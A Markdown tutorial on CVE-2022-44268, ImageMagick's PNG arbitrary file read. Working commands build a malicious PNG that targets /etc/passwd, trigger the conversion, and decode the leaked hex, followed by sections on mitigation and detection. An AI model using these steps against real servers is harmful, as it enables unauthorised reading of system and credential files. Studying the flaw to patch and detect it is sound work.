---
title: ImageMagick CVE-2022-44268 — arbitrary file read
tags: [linux, web, imagemagick, png, cve-2022-44268, file-read]
---

# CVE-2022-44268: ImageMagick reads whatever you ask

**English** | [🇪🇸 Español](imagemagick-file-read.md)

## 1. The bug

In `coders/png.c`, `ReadOnePNGImage` processes text chunks (`tEXt`/`zTXt`). If the keyword is literally `profile`, the value is treated as a **filename** and its contents are loaded as a raw profile. When the image is rewritten, that profile travels inside the output PNG.

It affects ImageMagick **7.1.0-49** (and nearby earlier builds); fixed in 7.1.0-50 by adding the `LocaleCompare(key,"profile") == 0` check in commit `05673e6`. CVSS 3.1: 6.5–7.5, CWE-200.

## 2. Building the PNG

With `pngcrush`, add the chunk to any image:

```bash
pngcrush -text a 'profile' '/etc/passwd' input.png output.png
```

Equivalent in Python with `pypng` or `PIL` + `PngInfo`: the chunk must be `tEXt` with keyword `profile` and the text set to the absolute path. A relative path works if the process runs in the right directory.

## 3. Trigger the conversion

Any operation that **rewrites** the image works: resize, format conversion, thumbnail generation.

```bash
convert output.png -resize 50% leak.png
magick output.png -resize 50% leak.png
```

If the web app does the conversion, upload `output.png` and download the result.

## 4. Extracting the contents

```bash
identify -verbose leak.png | sed -n '/Raw profile type/,/^$/p'
```

The output includes a length and the content in **hexadecimal**:

```text
Raw profile type:

    2367
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a...
```

```bash
python3 - <<'PY'
import re, subprocess
out = subprocess.check_output(["identify", "-verbose", "leak.png"]).decode()
hexdump = re.search(r"Raw profile type[^\n]*\n\n\s*\d+\n([0-9a-fA-F\n]+)", out).group(1)
print(bytes.fromhex(hexdump.replace("\n", "")).decode(errors="replace"))
PY
```

## 5. Why it works, and when it does not

- The process (`convert`, `magick` or the web service) reads the file with **its** permissions: as `www-data`, you will not see `/etc/shadow`.
- The profile is written into the output PNG, not into the HTTP response: if the app returns the transformed image, you have your channel.
- If the app returns only a thumbnail or recompresses without profiles, the content is lost; ask for the transformed original instead.
- With a restrictive `policy.xml` (`<policy domain="path" rights="none" pattern="/etc/*"/>`) the bug does not trigger.

## 6. Typical errors

- **`identify` shows no profile** → the conversion did not rewrite the image, or `-strip` was used.
- **The hex is truncated** → profiles have a size cap; read small files or read in pieces.
- **`no decode delegate for this image format`** → the generated PNG is corrupt; validate with `pngcheck`.
- **`improper image header`** → the chunk was inserted as `zTXt` with invalid compression; use `tEXt`.

## 7. Detection and mitigation

- Update ImageMagick to 7.1.0-50 or later; on distributions, apply the vendor patch (DSA-5347, USN, SUSE).
- `policy.xml` with `domain="path" rights="none"` for sensitive paths and `domain="coder"` for unused coders.
- Disable profiles in the pipeline (`-strip`, `-define png:exclude-chunks=all`) when they are not needed.
- Detection: uploaded PNGs with a `tEXt` keyword of `profile`, or whose value looks like an absolute path.

MITRE: T1005, T1190, T1552.001.
